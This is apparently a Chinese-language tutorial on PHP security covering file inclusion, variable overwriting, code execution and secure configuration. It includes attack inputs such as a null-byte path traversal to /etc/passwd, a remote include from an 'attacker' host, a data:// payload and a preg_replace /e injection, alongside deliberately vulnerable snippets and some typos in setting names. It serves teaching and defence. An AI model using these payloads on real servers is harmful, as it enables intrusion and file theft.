# PHP安全

## 一.文件包含漏洞

​	文件包含漏洞的本质是代码注入，即用户可以控制脚本在服务器上执行。

​	而文件包含漏洞的直接原因是使用了include、require等函数，这些函数将被包含文件的内容当做PHP脚本执行（而不管这些文件的类型是什么），攻击者能够对这些函数所包含的文件进行控制。

​	文件包含漏洞常分为本地文件包含和远程文件包含。

### 1.远程文件包含：

​	远程文件包含的必要有条件是启用allow_url_include

------

栗子：

`````php
<? php
    if ($route == "share") {
        require_once $basePath . '/action/m_share.php';
    } elseif ($route == "sharelink") {
        require_once $basePath . '/action/m_sharelink.php';
    }
?>
`````

​	这里可以传入/? param=http://attacker/phpshell.txt?，注意最后的?，这也是一种截断方式

### 2.本地文件包含：

​	本地文件包含比远程文件包含的内容更多，技巧更丰富，可以结合文件上传等漏洞进行攻击。利用方式也多种多样，既可以执行脚本达到攻击目的，也可以查看一些目标主机上的保密文件（/etc/passwd等）。

----------------------------

例，使用文件包含漏洞读取文件：

``````php
<? php
    $file = $_GET['file']; // "../../etc/passwd\0"
    if (file_exists('/home/wwwrun/'.$file.'.php')) {
        // file_exists will return true as the file /home/wwwrun/../../etc/passwd exists
        include '/home/wwwrun/'.$file.'.php';
        // the file /etc/passwd will be included
    }
?>
``````

​	这段代码存在文件包含漏洞，构造 ?file=../../etc/passwd%00，这里使用了0字节截断了后续的文件后缀（5.3.4之前）。

​	0字节截断是文件包含的常用技巧，但是其在5.3.4之后已经被修复，即是目标是没有修复的版本，也可以使用函数 str\_replace("\0",'',$\_GET['查询参数']) 禁用0字节截断。利用操作系统对目录最大长度的限制，可以不需要0字节而达到截断的目的。目录字符串，在Windows下256字节、Linux下4096字节时会达到最大值，最大值长度之后的字符将被丢弃。如何构造出这么长的目录呢？通过“./”的方式即可，比如：

././././././abc或者////////////abc或者../1/abc/../1/abc

​	这个例子中没有执行脚本，仅仅读取了一些文件，其实除了include和require之外，还有readfile、fpassthru等操作文件的函数也需要注意。

​	上面的../这样返回上层目录的方法称为目录遍历，可以使用编码等方式来绕过服务器端逻辑。目录遍历漏洞是跨目录读取文件的方法，但当PHP配置了open_basedir时，可以保护服务器免受这种攻击。**open_basedir的作用是限制在某个特定目录下PHP能打开的文件**。需要注意的是open_basedir的值是目录的前缀，open_basedir=/home/app/aaa可以打开/home/app/aaabbbccc,要制定一个目录，必须在最后加上/。该选项可以设置多个目录，windows下使用分号分隔，其他使用冒号分隔，而且php脚本所在的目录不是默认可以访问的，必须进行设置。

### 3.本地文件包含技巧

​	想要有效利用本地文件包含，需要找到一个攻击者能够控制内容的本地文件，以下是常用的文件：

<ol>
    <li>用户上传的文件</li>
    <li>data:// php://input等伪协议</li>
    <li>Session文件</li>
    <li>日志文件</li>
    <li>/pro/self/environ文件</li>
    <li>上传的临时文件</li>
    <li>其他文件创建的文件</li>
</ol>

#### a.用户上传文件

​	用户上传文件的利用取决于文件上传功能的设计，我们往往需要猜测文件上传后的物理路径，这是比较难做到的。

#### b.伪协议

​	这时php伪协议就提供了另一种不需要知道物理路径的攻击方法，php伪协议需要启用allow_url_include等选项。

​	下面介绍几个常见的伪协议。

##### file://

* 条件：

  无

* 作用:

  访问本地文件系统，且不受allow_url_include和allow_url_fopen的影响

  和我们通常指定文件路径没什么区别，既有相对路径也有绝对路径。

##### php://

* 条件：

  仅php://input php://stdin php://memory php://temp需要allow_url_include为on

* 作用：
  访问各个输入输出流。

  php://input访问POST中data的内容

  php://filter我至今使用的次数都很少，这里不多讲，但是需要知道这各位协议是作用于输入输出流的中间流，例如对一些字符串进行过滤和解码

##### data://

* 条件

  allow_url_fopen()=on

  allow_url_include=on

* 作用

  和input类似，将include的文件流重定向到了用户可控的输入流中

  例如:https://120.27.226.67?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b

  file参数的内容就可以作为一个文件流被include等函数使用

#### c.Session文件

​	该文件的使用条件较为苛刻，而且我目前没有使用过，在此不多谈，但需要知道PHP默认生成的Session文件往往在/tmp目录下。

#### d.日志文件

​	该文件很常用，因为Web Server往往会在access_log中记录客户端的请求，这就相当于我们可以控制本地文件的内容。需要注意的是，当网站请求量比较大时，日志文件可能会很大，php在使用函数引用该文件时可能会导致进程僵死，日志文件是会刷新的或者定时生成一个新的日志文件，在凌晨或者日志刷新的时候包含成功率会有效增长。

​	利用日志文件的一般步骤是先通过读取httpd的配置文件httpd.conf找到日志文件所在的目录。httpd.conf默认安装位置可能在apache的安装目录下，也可能根据系统的不同在某个目录下（这个需要根据系统自行判断），但是总的来说猜到目录是比较难的。很多工具中都可以完成自动化的日志攻击。

#### e./proc/self/environ

​	该文件不需要猜测被包含文件的路径，同时用户也能控制它的内容。这个文件是Linux系统下的环境变量文件，用于保存系统的一些变量，其中也包括web服务器的一些环境变量，其中很多内容是用户可以控制的，常见的攻击方式是通过User-Agent中注入PHP代码。

#### f.上传的临时文件

​	临时存放上传文件的目录往往都是tmp，而且是一定可以被PHP访问的。但是上传文件的文件名是随机的，攻击者需要猜测这个文件名，不过PHP没有使用安全的随机函数，使得暴力破解文件名成为可能。

### 4.如何有效防止文件包含漏洞

* 使用枚举型，尽量避免使用动态变量作为文件名
* 关闭allow_url_include

* 设置open_basedir

* 尽量关闭不需要的伪协议

* 一些文件不要使用其默认保存目录

## 二.变量覆盖漏洞

​	变量覆盖漏洞的根本原因是一些变量没有初始化，而且可以被用户控制。直接原因是register_globals的配置和一些函数的使用不规范。

### 1.regisetr_globals导致的变量覆盖漏洞

​	register_globals在4.2.0之后默认由ON变为了OFF，5.4版本后以及被移除，通常我们通过url传入的查询字符串都需要通过$\_GET获取，还有POST、Cookie等需要相应的方法获取并赋值给一个变量，但是register_gloabls开启后，传入的查询字符串直接注册为变量，不需要获取并赋值。

---------------

举个栗子：

`````php
<?php
    echo "Register_globals:".(int)ini_get("regisetr_globals")."<br/>";
	if($auth){
        echo "private!";
    }
?>
`````

​	如果设置了register_globals为ON，直接传入https://site/script?auth=1，那么auth就会直接被注册为$auth变量，脚本会回显private!

--------------

​	如果一定要开启regisetr_globals，或者说不方便配置php.ini文件时，我们可以用代码关闭register_globals:

`````php
# ini_get返回配置选项的值，0或者1或者字符串
if (ini_get('regisetr_globals')){
    foreach($_REQUEST as $k=>$v) unset(${$k});
}
`````

这是一段常见的禁用register_globals的代码，但是仍不安全，因为unset(${$k})只能释放非全局变量，如果传入GLOABLs[a]=1，$a是无法被释放的，全局变量需要unset($GLOBALS['a'])才能释放。

`````php
<?php
// Emulate register_globals off
function unregister_GLOBALS()
{
    if (!ini_get('register_globals')) {
        return;
    }

    // Might want to change this perhaps to a nicer error
    if (isset($_REQUEST['GLOBALS']) || isset($_FILES['GLOBALS'])) {
        die('GLOBALS overwrite attempt detected');
    }

// Variables that shouldn't be unset
    $noUnset = array('GLOBALS', '_GET',
        '_POST', '_COOKIE',
        '_REQUEST', '_SERVER',
        '_ENV', '_FILES');

    $input = array_merge($_GET, $_POST,
        $_COOKIE, $_SERVER,
        $_ENV, $_FILES,
        isset($_SESSION) && is_array($_SESSION) ? $_SESSION : array());

    foreach ($input as $k => $v) {
        if (!in_array($k, $noUnset) && isset($GLOBALS[$k])) {
            unset($GLOBALS[$k]);
        }
    }
}

unregister_GLOBALS();
?>
`````

这段代码是推荐使用的

### 2.extract函数导致的变量覆盖漏洞

函数原型：

int extract (array $var_array[,int $extract_type[,string $prefix]])

函数的功能是创建一系列变量，变量名为数组的字符串下标，值为下标对应的值。

第二个参数常用的有EXTR_OVERWRITE和EXTR_SKIP，前者在变量导入符号表时，如果变量名发生冲突，会覆盖已有的变量，后者则不覆盖，默认使用第一个参数。

----------------

举个栗子：

`````php
<?php
    $auth='0';
	extract($_GET);
	if ($auth==1){
        echo "private!";
    }else{
        echo "public!";
    }
?>
`````

传入http://site/script?auth=1,结果是回显private.

----------------

安全的做法是关闭register_globals之后，在调用extract时第二个参数使用EXIT_SKIP。但是extract的参数来源能被用户控制是不好的习惯。

### 3.遍历初始化变量

`````php
$chs = '';
if($_POST && $charset ! = 'utf-8') {
            $chs = new Chinese('UTF-8', $charset);
            foreach($_POST as $key => $value) {
                    $$key = $chs->Convert($value);
            }
            unset($chs);
`````

这一段代码的关键在于遍历初始化变量时使用了$$key，所以在代码审计时必须注意$$

### 4.import_rquest_variables

函数原型：

bool import_request_variables ( string $types [, string $prefix ] )

这个函数将GET、POST、Cookie中的变量导入到全局，第一个必须参数为有三种'G' 'P' 'C',可以任意组合，没有指定第一个参数时则覆盖全局变量。

````php
<?php

    $auth = '0';
    import_request_variables('G');

    if ($auth == 1){
      echo "private! ";
    }else {
      echo "public! ";
    }

?>

````

传入http://site/script?auth=1

### 5.parse_str()

函数原型：

void parse_str(string $str[,array &$arr])

该函数可以解析URL查询字符串，通常传入$_SERVER['QUERY\_STRING']，第二个数组参数可以将解析的字符串存入其中，存入其中后可以避免变量覆盖问题。

### 6.如何有效防止变量覆盖漏洞

* 确保regisetr_globals=Off(5.4版本后以及被移除)，不能控制该配置时，使用代码禁用
* 熟悉可能造成变量覆盖的函数和方法，检查用户是否可以控制变量来源
* 养成初始化变量的好习惯

## 三.命令/代码执行漏洞

​	出现该漏洞的必要条件是用户能够控制函数的输入，且存在可以执行代码的危险函数。

### 1.命令执行函数	

​	命令执行后漏洞主要是一些危险函数需要注意，对于这些危险函数尽量将他们禁用。在代码审计时，也需要特别注意这些函数。

### 2.preg_replace代码执行

​	preg_replace本来是一个利用正则表达式替换字符串内容的函数，但是有一个危险修饰符为e，e修饰符会使替换后的字符进行命令执行。

---------------

举个例子：

`````php
<?php
    $var = '<tag>phpinfo()</tag>';
	// 第二个参数中的\\1(\\1是单引号的一种写法，双引号当然使用\1)代表pattern中的第一个括号内的内容，即$var被替换为addslashes(phpinfo()),并且执行。
	preg_replace("/<tag>(.*?)<\/tag>/e",'addslashes(\\1)',$var);
?>
`````

​	但是如果第一个参数没有使用修饰符e，有时候也可以通过零字符截断达到目的：

`````php
<?php
    $regexp=$_GET['re'];
    $var = '<tag>phpinfo()</tag>';
	preg_replace("/<tag>(.*?)$regexp<\/tag>/",'addslashes(\\1)',$var);
?>
`````

​	可以针对其上传index.php?re=<\/tag>/e%00

### 3.用户自定义动态函数执行

```php
<?php
    $func=$_GET['func'];
	$arg=$_GET['arg'];
	$func($arg);
?>
```

与上述例子类似，create_function()函数也具备这样的功能:create_function('参数','函数体')返回值为一个匿名函数，也需要注意这个函数的使用。

### 4.Curly Syntax（复杂花括号语法）

```php
<?php
// 显示所有错误
error_reporting(E_ALL);

$great = 'fantastic';

// 无效，输出: This is { fantastic}
echo "This is { $great}";

// 有效，输出： This is fantastic
echo "This is {$great}";

// 有效
echo "This square is {$square->width}00 centimeters broad.";

// 有效，只有通过花括号语法才能正确解析带引号的键名
echo "This works: {$arr['key']}";

// 有效
echo "This works: {$arr[4][3]}";

// 这是错误的表达式，因为就象 $foo[bar] 的格式在字符串以外也是错的一样。
// 换句话说，只有在 PHP 能找到常量 foo 的前提下才会正常工作；这里会产生一个
// E_NOTICE (undefined constant) 级别的错误。
echo "This is wrong: {$arr[foo][3]}";

// 有效，当在字符串中使用多重数组时，一定要用括号将它括起来
echo "This works: {$arr['foo'][3]}";

// 有效
echo "This works: " . $arr['foo'][3];

echo "This works too: {$obj->values[3]->name}";

// 实际上等同于$$name，但是在字符串中写"$$name"实际上的结果是'$lda'($name='lda')
echo "This is the value of the var named $name: {${$name}}";

echo "This is the value of the var named by the return value of getName(): {${getName()}}";

echo "This is the value of the var named by the return value of \$object->getName(): {${$object->getName()}}";

// 无效，输出： This is the return value of getName(): {getName()}
echo "This is the return value of getName(): {getName()}";
?>
```

​	这里的花括号有一点python中format的以味道了，但是注意花括号起作用一定是和$一起

`````php
<?php
class foo {
    var $bar = 'I am bar.';
}

$foo = new foo();
$bar = 'bar';
$baz = array('foo', 'bar', 'baz', 'quux');
echo "{$foo->$bar}\n";
echo "{$foo->{$baz[1]}}\n";
?>
`````

------------

命令执行的例子：

`````php
<?php
    $foobar='phpinfo';
	// 这个用法上面没有介绍，但事实确实可以行的。
	// 等同与$foobar() 实际上是phpinfo()
	${'foobar'}();
?>
`````

​	PHP的复杂花括号的${ }和{$ }等效

### 5.回调函数

​	回调函数就是可以传入函数名作为参数的函数，函数名以字符串形式传入，这也提供了命令执行或代码执行的机会。

## 四.安全的PHP配置

* register_globals=Off (4.2版本后默认为off，5.4版本移除)
* open_basedir合理的设置
* 非必要情况下关闭allow_ulr_fopen和allow_ule_include
* 关闭display_errors
* log_errors=On
* magic_quotes_gpc=off,这个函数不值得依赖，其性能低而且会导致新的安全问题
* 若PHP以CGI形式安装，需要关闭cgi.fix_pathinfo，避免文件解析问题
* 开启HttpOnly
* 全站启用https时开启session.cookie_secure
* safe_mode充满争议，共享环境下推荐开启（配合disable_functions），私有环境则关闭。
* disable_functions能够禁用一些函数，具体函数不再多说。
